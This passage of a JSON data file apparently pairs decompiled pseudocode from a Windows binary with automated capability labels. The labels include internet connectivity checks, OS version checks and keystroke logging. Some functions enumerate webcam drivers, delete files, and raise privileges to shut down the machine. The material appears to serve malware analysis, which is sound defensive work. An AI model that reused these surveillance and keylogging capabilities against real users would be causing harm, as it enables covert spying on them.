0x475a04;\n    fcn.00405974();\n    if (uVar3) {\n        puStack64 = 0x475a13;\n        fcn.00473610();\n        puStack64 = 0x475a25;\n        fcn.0047002c();\n    }\n    puStack64 = 0x475a32;\n    fcn.00473610();\n    puStack64 = 0x475a3f;\n    fcn.00405974();\n    if (uVar3) {\n        puStack64 = 0x475a46;\n        fcn.00483864();\n    }\n    uStack68 = 0x475a94;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.00475980::var_1h + 1;\n    fcn.00471b48();\n    fcn.00471c88();\n    fcn.00472618();\n    fcn.00472708();\n    fcn.004727f8();\n    fcn.004728e8();\n    fcn.00471ff8();\n    fcn.00472168();\n    *in_FS_OFFSET = uStack72;\n    if (in_AL == '\\x01') {\n        puStack64 = 0x475aae;\n        fcn.0048a8c0();\n    }\n    puStack64 = 0x475ab3;\n    cVar1 = fcn.00473b94();\n    if (cVar1 == '\\0') {\n        puStack64 = 0x475ac1;\n        fcn.0040f23c();\n        puStack64 = 0x475ace;\n        fcn.00474fa8();\n    }\n    puStack64 = **0x495af4;\n    uStack68 = 0x475adb;\n    sub.wsock32.dll_closesocket();\n    uStack68 = 0x475ae0;\n    sub.kernel32.dll_GetCurrentProcessId();\n    uStack68 = 0x475ae5;\n    fcn.00484e64();\n    *in_FS_OFFSET = puStack64;\n    *in_FS_OFFSET = puStack52;\n    uStack44 = 0x475b25;\n    uStack48 = 0x475b1d;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 995
    },
    "00484a2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00484a2c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack332;\n    uint uStack328;\n    uchar *puStack324;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    puStack324 = 0x484a50;\n    fcn.004059cc();\n    uStack328 = 0x484b13;\n    uStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack324 = &stack0xfffffffc;\n    iVar1 = fcn.00460cc4();\n    if ((iVar1 != -1) && (iVar1 = fcn.00460ce4(),  iVar1 != 0)) {\n        while (iVar1 = fcn.00460d04(),  iVar1 != 0) {\n            fcn.004057a0();\n            fcn.0040986c();\n            fcn.00405b28();\n        }\n    }\n    *in_FS_OFFSET = uStack332;\n    puStack324 = 0x484b1a;\n    uStack328 = 0x484b0a;\n    fcn.00405554();\n    uStack328 = 0x484b12;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 318
    },
    "00486194": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00486194(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    bool bVar3;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    var_1ch = &stack0xfffffffc;\n    iVar2 = 7;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_14h = 0x4864fe;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *0x486546 = 1;\n    bVar3 = true;\n    var_20h = 0x4864c2;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_24h;\n    fcn.00405974();\n    if (bVar3) {\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048b3a8();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048b3a8();\n        fcn.0048a3f0(0x486540);\n        fcn.00405818();\n        fcn.0048a3f0(var_20h);\n        fcn.00405818();\n        fcn.0048b0fc();\n        fcn.0048a3f0();\n        fcn.00405818();\n        fcn.0048b300();\n        fcn.0048a3f0();\n        fcn.00405818();\n        uVar1 = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA(uVar1);\n        fcn.0048a3f0();\n        fcn.00405818();\n        var_30h = fcn.004059dc();\n        sub.kernel32.dll_DeleteFileA();\n        fcn.00409d78();\n        fcn.004860c8();\n    }\n    else {\n        fcn.00405974();\n        if (bVar3) {\n            fcn.00405b28(&var_4h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&var_8h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            var_30h = &var_ch;\n            fcn.00405b28();\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            uVar1 = fcn.00409ee4();\n            uVar1 = fcn.004059dc(uVar1);\n            uVar1 = fcn.004059dc(uVar1);\n            uVar1 = fcn.00409ee4(uVar1);\n            sub.user32.dll_MessageBoxA_1(uVar1);\n        }\n        else {\n            fcn.00405974();\n            if (bVar3) {\n                fcn.00405b28(&var_4h);\n                fcn.00405a44();\n                fcn.00405b28();\n                fcn.00405a84();\n                fcn.004055c8();\n                uVar1 = fcn.00409ee4();\n                var_30h = fcn.00409ee4(uVar1);\n                sub.kernel32.dll_Beep();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_30h;\n    *(var_14h + 0x48) = 0;\n    return;\n}\n",
        "token_count": 1017
    },
    "0048a8c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0048a8c0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uchar auStack44 [40];\n    \n    if (**0x495d18 == 2) {\n        uStack52 = 0x28;\n        uStack56 = 0x48a8d8;\n        puStack48 = &stack0xffffffd4;\n        uStack56 = sub.kernel32.dll_GetCurrentProcess();\n        puStack60 = 0x48a8de;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            puStack60 = &stack0xffffffd4;\n            uStack64 = 0x48a950;\n            uVar2 = 0;\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0);\n            puStack60 = 0x1;\n            puStack48 = 0x2;\n            uStack64 = 0;\n            if (iVar1 != 0) {\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (uVar2, 0, &stack0xffffffc4, 0x10, &stack0xffffffd4, &stack0xffffffc0);\n            }\n        }\n    }\n    iVar1 = sub.user32.dll_ExitWindowsEx();\n    return iVar1 != 0;\n}\n",
        "token_count": 329
    },
    "0048b9f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048b9f0(code *param_1)\n\n{\n    char in_AL;\n    char cVar1;\n    \n    cVar1 = fcn.0048b954();\n    if (cVar1 != '\\0') {\n        if (in_AL == '\\x01') {\n            (*param_1)(0xffffffff);\n        }\n        else {\n            (*param_1)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0048cf3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0048cf3c(uint param_1, double *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    float10 fVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar auStack28 [16];\n    \n    uStack36 = *in_EAX;\n    uStack32 = in_EAX[1];\n    iVar1 = sub.kernel32.dll_FileTimeToSystemTime(&uStack36, auStack28);\n    if (iVar1 != 0) {\n        fVar2 = fcn.0040bc08();\n        *param_2 = fVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 153
    },
    "0048d804": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048d804(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack560;\n    uint uStack556;\n    uchar *puStack552;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ah;\n    uint var_105h;\n    \n    puStack552 = &stack0xfffffffc;\n    uStack556 = 0x48d8cb;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    iVar2 = 0;\n    while (iVar1 = sub.AVICAP32.DLL_capGetDriverDescriptionA\n                             (iVar2, &fcn.0048d804::var_105h, 0x105, &fcn.0048d804::var_20ah, 0x105),  iVar1 != 0) {\n        fcn.004057a0(*in_EAX);\n        fcn.004057a0(0x48d8e4, 0);\n        fcn.004058e0(0x48d8f0, 0);\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack560;\n    puStack552 = 0x48d8d2;\n    uStack556 = 0x48d8ca;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 325
    },
    "0048d8f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.0048d8f4(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0x48d930;\n    uStack20 = 0x48d940;\n    iStack24 = 0x48d906;\n    iStack24 = sub.kernel32.dll_GetModuleHandleA_2();\n    pcVar1 = sub.kernel32.dll_GetProcAddress_1();\n    if (pcVar1 == NULL) {\n        unaff_EBX = 0;\n    }\n    else {\n        uVar2 = sub.kernel32.dll_GetCurrentProcess(&stack0xffffffe8);\n        iVar3 = (*pcVar1)(uVar2);\n        if (iVar3 != 0) {\n            unaff_EBX = iStack24 != 0;\n        }\n    }\n    return CONCAT44(iStack24, unaff_EBX);\n}\n",
        "token_count": 227
    },
    "00403e68": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00403e68(void)\n\n{\n    fcn.00403d88();\n    return;\n}\n",
        "token_count": 25
    },
    "00403e90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e90(uint param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    \n    if (2 < *(in_EAX + 1) - 0xd7b1) {\n        iVar1 = fcn.00407688();\n        *(iVar1 + 4) = 0x67;\n        return;\n    }\n    iVar1 = sub.kernel32.dll_SetFilePointer(*in_EAX, in_EAX[2] * param_2, 0, 0);\n    if (iVar1 != -1) {\n        return;\n    }\n    sub.kernel32.dll_GetLastError();\n    fcn.0040307c();\n    return;\n}\n",
        "token_count": 160
    },
    "00404544": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404544(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x4045cb;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404530();\n    fcn.00405794();\n    uVar1 = fcn.0040580c();\n    uVar1 = fcn.004059dc(uVar1);\n    uVar1 = fcn.0040580c(uVar1);\n    uVar1 = fcn.004059dc(uVar1);\n    uVar2 = 0x800;\n    sub.kernel32.dll_CompareStringA(0x800, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x4045d2);\n    return;\n}\n",
        "token_count": 243
    },
    "0040a174": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a174(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.004059dc(*((param_2 & 3) * 4 + 0x492858), *(((param_2 & 0xf0) >> 4) * 4 + 0x492864), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "0040b275": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b275(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.0040b1ca();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.0040b1ca();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 645
    },
    "0040eb10": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040eb10(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *0x4988c8 = 0x409;\n    *0x4988cc = 9;\n    *0x4988d0 = 1;\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar1 != 0) {\n        *0x4988c8 = uVar1;\n    }\n    if (uVar1 != 0) {\n        *0x4988cc = uVar1 & 0x3ff;\n        *0x4988d0 = (uVar1 & 0xffff) >> 10;\n    }\n    puVar3 = 0x40ebb4;\n    puVar4 = 0x492828;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((*0x4927e4 < 5) || (*0x4927e0 != 2)) {\n        iVar2 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x4988d5 = iVar2 != 0;\n    }\n    else {\n        *0x4988d5 = true;\n    }\n    iVar2 = sub.user32.dll_GetSystemMetrics(0x2a);\n    *0x4988d4 = iVar2 != 0;\n    if (*0x4988d4) {\n        fcn.0040eab4(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "00416690": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416690(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00420be0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420be0(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x420c4a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "00425fb8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425fb8(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_2 = param_2 + -1;\n    if (-1 < param_2) {\n        if (**0x495c00 < 3) {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n        else {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00437a7c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00437a7c(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.004379c0();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004047dc();\n            if (cVar3 != '\\0') {\n                fcn.00436a68();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.00436a68();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.00437128();\n        uVar2 = fcn.00437610();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.004348c0();\n        }\n        uVar1 = *(**0x495b10 + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x277) == '\\x02')) && (piVar4 == *(uVar1 + 0x2a0))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x29c), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.00458594();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 451
    },
    "0043eb74": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043eb74(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0043f4c4();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0043f510();\n            if (*(iVar2 + 0x273) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "0043fcb4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0043fcb4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x277) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 78
    },
    "0044e198": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044e198(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "0046d0c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.0046d0c0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint32_t uStack184;\n    uint uStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint32_t uStack164;\n    int32_t iStack152;\n    \n    uVar4 = 0;\n    puStack172 = 0x46d0dc;\n    fcn.00403af4();\n    uStack164 = 0x94;\n    puStack172 = &stack0xffffff5c;\n    uStack176 = 0x46d0ee;\n    iVar1 = sub.kernel32.dll_GetVersionExA();\n    if (((iVar1 != 0) && (iStack152 == 2)) && (5 < uStack164)) {\n        uStack176 = 0x46d140;\n        uStack180 = 0x46d10a;\n        uVar2 = sub.kernel32.dll_LoadLibraryA();\n        if (uVar2 != 0) {\n            uStack180 = 0x46d14c;\n            uStack184 = uVar2;\n            pcVar3 = sub.kernel32.dll_GetProcAddress_1();\n            if (pcVar3 != NULL) {\n                (*pcVar3)(&stack0xffffff48);\n                uVar4 = uStack184 & 0xff;\n            }\n        }\n        sub.kernel32.dll_FreeLibrary_1(uVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 341
    },
    "00474ebc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00474ebc(code **arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    \n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0xd]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[3] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xc], arg_8h[0xe]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[2] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0xf]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[4] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x10]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[5] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x11]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[6] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x12]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[7] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x15]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[8] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x13]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[9] = pcVar3;\n    uVar2 = (**arg_8h)(arg_8h[0xb], arg_8h[0x14]);\n    pcVar3 = (*arg_8h[1])(uVar2);\n    arg_8h[10] = pcVar3;\n    while( true ) {\n        cVar1 = (*arg_8h[5])(arg_8h[0x17]);\n        if (cVar1 != '\\0') break;\n        iVar4 = (*arg_8h[6])();\n        if (iVar4 == 2) break;\n        (*arg_8h[3])(500);\n    }\n    iVar4 = (*arg_8h[9])(1, 0, arg_8h[0x16]);\n    if (iVar4 != 0) {\n        (*arg_8h[10])(iVar4);\n        (*arg_8h[7])(iVar4);\n        (*arg_8h[8])(iVar4);\n        (*arg_8h[4])(0);\n    }\n    return;\n}\n",
        "token_count": 731
    },
    "0048b6f8": {
        "rules": [
